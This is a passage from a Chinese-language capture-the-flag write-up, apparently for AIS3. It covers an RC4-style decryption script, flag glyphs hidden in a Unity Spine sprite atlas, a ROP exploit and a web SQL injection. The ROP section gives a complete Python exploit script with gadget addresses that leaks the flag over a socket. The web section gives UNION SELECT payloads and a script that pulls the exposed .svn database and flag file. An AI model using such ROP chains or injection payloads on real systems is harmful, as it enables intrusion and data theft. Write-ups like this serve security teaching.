04000000 00000000 05000000 05000000
05000000 00000000 01000000 00000000
04000000 00000000 00000000 00000000
05000000 00000000 05000000 00000000
01000000 00000000 00000000 04000000
04000000 00000000 05000000 00000000
05000000 00000000 01000000 00000000
04000000 04000000 00000000 03000000
"""

raw = bytes.fromhex("".join(pattern_hex.split()))
vals = struct.unpack("<40I", raw)

h = 0x811c9dc5
for v in vals:
    h ^= v
    h = (h * 0x1000193) & 0xffffffff

key = []
for i in range(24):
    key.append((h >> ((i % 4) * 8)) & 0xff)
    h = (h * 0x41c64e6d + 0x3039) & 0x7fffffff

ct = bytes.fromhex(
    "2ea556460d7c8edc836f3083fff8a55c"
    "d076d8cd99dc3f399d657064"
)

S = list(range(256))
j = 0

for i in range(256):
    j = (j + S[i] + key[i % len(key)]) & 0xff
    S[i], S[j] = S[j], S[i]

i = j = 0
pt = bytearray(ct)

for n in range(len(pt)):
    i = (i + 1) & 0xff
    j = (j + S[i]) & 0xff
    S[i], S[j] = S[j], S[i]
    pt[n] ^= S[(S[i] + S[j]) & 0xff]

print(pt.decode())
```
輸出：    
```
AIS3{T3tr1s_P4tt3rn_M4st3r!}
```
所以 flag 是： 
```
AIS3{T3tr1s_P4tt3rn_M4st3r!}
```
# 第十題 Hidden in the Cloak    
這題一開始很容易被帶去看 Assembly-CSharp.dll 裡的抽卡/API 邏輯，因為裡面能直接找到網址 http://chals1.ais3.org:50001，還有送分數、金錢、擊殺數的 JSON 格式。實際去打這個 API，也的確會回一個看起來像 flag 的字串：`AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}`。但這題題名是 hidden-in-the-cloak，而且我前面也驗證過這個 flag 是錯的，所以我覺得：這多半是誘餌。
接著把重心轉到遊戲素材。Unity 專案裡比較可疑的是 `Reverse1_Data\StreamingAssets\bundles\character_main`。把這個 bundle 解開之後，可以拿到三個關鍵檔案：`character.png，character.atlas.txt，character.txt`。這是一套 Spine 角色資源：character.png 是圖集、character.atlas.txt 描述每個小圖片在圖集上的座標、character.txt 則是骨架和動畫資料。
看到題名有 cloak，我先去找披風相關區塊。從`character.txt` 可以看到 s064 掛的是 r015，尺寸 160x220，顏色是深紫色，看起來很像披風；`character.atlas.txt` 也能對上 r015 的位置。把 r015 從圖集切出來後，會發現它本身不是藏字的地方，它只是白色遮罩，進遊戲後由 Spine slot 的 tint 染成深色披風。這一步很重要，因為它說明「藏在披風裡」不是指 LSB 或 stego，而是指整個角色披風那組素材系統。
我認為真正的突破點在於直接看整張 `character.png`。這張圖集除了角色部件外，還藏了很多白色字元小圖，例如 `AIS3{、d0n7_70、uch_my_、c4p3_0k_`，還有很多單個字母數字。這表示 flag 不是存在程式碼裡，而是被拆成很多 glyph，塞在角色素材裡。
最後去看 `character.txt` 的 `animations -> emote_a`。這段動畫會把骨架 b013 到 b025 這幾個節點橫向排開，每個節點都對應到一個 slot，而 slot 又各自掛著不同的圖塊。只要依照這些骨架在動畫中的 x 座標由左到右排序，再把每個節點對應到的圖塊內容串起來，就能還原出完整 flag。排序結果如下：    
```
b013 -> r037 -> AIS3{
b014 -> r017 -> d0n7_70
b015 -> r016 -> uch_my_
b016 -> r034 -> c4p3_0k_
b017 -> r047 -> b
b018 -> r031 -> 3
b019 -> r050 -> f
b020 -> r032 -> 1
b021 -> r022 -> e
b022 -> r039 -> 7
b023 -> r058 -> 6
b024 -> r043 -> 8
b025 -> r042 -> }
```    
串起來就是：    
```
AIS3{d0n7_70uch_my_c4p3_0k_b3f1e768}
```    
# 第十一題  std::print("Hello, World") revenge 
## 漏洞與程式邏輯分析
### 1. 先看到編譯參數
```
g++ -std=c++23 -fno-stack-protector -no-pie -o chall chall.cpp
```
發現`-no-pie`：進程載入位址固定，Gadgets 地址可以直接硬編碼
`-fno-stack-protector`：沒有 Stack Canary，可以直接蓋 Return Address。
### 2. 再來觀察程式行為   
`load_flag()`：一開始就把 `flag.txt` 讀到全域變數 `FLAG`（BSS 段 `0x427040`）。

`show_number()`：呼叫 `std::print("Value: {2}\n", a, b, c)`。

`Question()`：裡面開了 `0x50` (80 bytes) 的 buffer，後面卻用 `read(0, buf, 0xe0)` 讀了 0xe0 (224 bytes)。這裡有很明顯的 **Stack Overflow**。這邊要注意的是：輸入第一個字必須是 Y 或 y，否則會直接 exit。

`main()`：跑完初始化後，就會進 `Question()` 的無窮迴圈。
### 3.Stack Layout 計算
計算 Buffer 到 Return Address 的距離：
+-------------------------+  rbp - 0x50
|  buffer (80 bytes)      |
+-------------------------+  rbp
|  saved rbp (8 bytes)    |
+-------------------------+  rbp + 0x08
|  return addr (8 bytes)  |  <- Target
+-------------------------+
Offset 為 $0x50 + 8 = 88$ bytes。Payload 填滿 88 bytes 後即可接 ROP chain。
### 4.利用 std::print 模板洩漏
Flag 雖然在 BSS，但我需要把它印出來。檢視 binary 可以發現裡面有 `std::print<int&, int&, int&>` 的模板實例（位址 `0x406b48`），我在 `.rodata` 找到一個 "{}" 字串，位於 `0x41a164`（長度為 2）。如果把 `rdi=2`, `rsi=0x41a164` 丟給 `std::print`，它就只會看 rdx 指向的位址，並把此處的 4 bytes 當成有號整數（int32）以十進位印出來。因此，只要讓 rdx 依序指向 Flag 的地址，我就可以把 Flag 解出來。
### 5.ROP Chain 設計
因為一次只能吐 4 bytes，我們利用 `Question()` 的無窮迴圈，每次印完就跳回 `main loop（0x40365d）`再跑一次，分段把整個 Flag 解出來。
單輪 Payload 結構：
```"Y" + A * 87 + pop_rdi(2) + pop_rsi("{}" addr) + pop_rdx(FLAG + 4*i) + lea_r8 + std::print + main_loop_addr```
### 6.我寫了一個python腳本如下
```
import struct
import socket
import sys

def qword(val):
    return struct.pack("<Q", val)

def dword_signed(val):
    return struct.pack("<i", val)

class Exploit:
    GADGETS = {
        "pop_rdi": 0x416e51,
        "pop_rsi": 0x4153f7,
        "pop_rdx": 0x41399c,
        "lea_r8":  0x4035c9,
    }

    TARGET     = 0x427040
    FMT        = 0x41a164
    PRINTER    = 0x406b48
    REENTER    = 0x40365d
    PAD_SIZE   = 88

    def __init__(self, host, port):
        self.conn = socket.create_connection((host, port), timeout=5)
        self._drain_banner()

    def _drain_banner(self):
        buf = b""
        while b"\n" not in buf:
            data = self.conn.recv(64)
            if not data:
                break
            buf += data

    def _craft(self, where):
        g = self.GADGETS
        chain  = qword(g["pop_rdi"]) + qword(2)         + qword(0)
        chain += qword(g["pop_rsi"]) + qword(self.FMT)   + qword(0)
        chain += qword(g["pop_rdx"]) + qword(where)
        chain += qword(g["lea_r8"])
        chain += qword(self.PRINTER)
        chain += qword(self.REENTER)
        return b"Y" + b"\x41" * (self.PAD_SIZE - 1) + chain

    def _recv_number(self):
        self.conn.settimeout(4)
        digits = b""
        try:
            while True:
                byte = self.conn.recv(1)
                if not byte:
                    break
                if byte in b"-0123456789":
                    digits += byte
                elif digits:
                    break
        except socket.timeout:
            pass
        return int(digits) if digits else None

    def run(self):
        result = b""
        for idx in range(40):
            self.conn.sendall(self._craft(self.TARGET + 4 * idx))
            val = self._recv_number()
            if val is None:
                break
            part = dword_signed(val)
            result += part
            sys.stdout.write(part.decode("latin1"))
            sys.stdout.flush()
            if b"}" in part or b"\x00" in part:
                break
        self.conn.close()
        return result.split(b"\x00")[0].decode()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "chals1.ais3.org"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 50002
    exp = Exploit(host, port)
    flag = exp.run()
    print(f"\n{flag}")
```
### 7.執行腳本取得flag
```
AIS3{f4k3_fl4g_1s_4ls0_4_fl4g}
```
# 第十二題 MyGO!!!!! X Ave Mujica 圖庫 
首先他給了一個網址http://chals1.ais3.org:48763/   
點進去可以發現此網站可以上傳圖片
![截圖 2026-05-21 上午11.31.06](https://hackmd.io/_uploads/B1YK2l3kzl.png)
我先試了`robots.txt`這個路徑，因為在很多web題目這是個可以嘗試的點
![截圖 2026-05-21 上午11.33.10](https://hackmd.io/_uploads/SJRGpl3kGe.png)
發現了有`.svn`原始碼洩漏，所以我測試了新版SVN的帳本，在url列後面加上`wc.db`看這個路徑能不能下載，發現網站回傳
**404 not found**
所以我又測試了舊的SVN帳本ㄧ樣在url列加上`entries`看這個路徑能不能下載，結果網站一樣回傳**404 not found**
所以接下來我用了SQL UNION SELECT來捏造的假資料，塞給原本的網頁，所以我可以輸入這串url http://chals1.ais3.org:48763/image?id=0UNIONSELECT'.svn/wc.db' ， 然後就拿到了`wc.db`這個檔案，但是看到這檔案後發現他是個二進制檔案，所以我寫了個腳本把路徑抓出來
```
import requests
url = "http://chals1.ais3.org:48763/image"
payload = {"id": "0 UNION SELECT '.svn/wc.db'"}
res = requests.get(url, params=payload)
with open("wc.db", "wb") as f:
    f.write(res.content)
print(f"[+] Done. Saved {len(res.content)} bytes.")
```
執行腳本後可以得到這個路徑：       
```
super_secret_starburst_flag114514.txt 
```       
接下來結合前面的SQL Injection + SVN檔案的路徑可以得到：
```
http://chals1.ais3.org:48763/image?id=0 UNION SELECT 'super_secret_starburst_flag114514.txt'
```
輸入該網址後就可以看到flag
![截圖 2026-05-21 中午12.55.12](https://hackmd.io/_uploads/BkWSgf2Jzg.png)
flag:`AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}`

    
        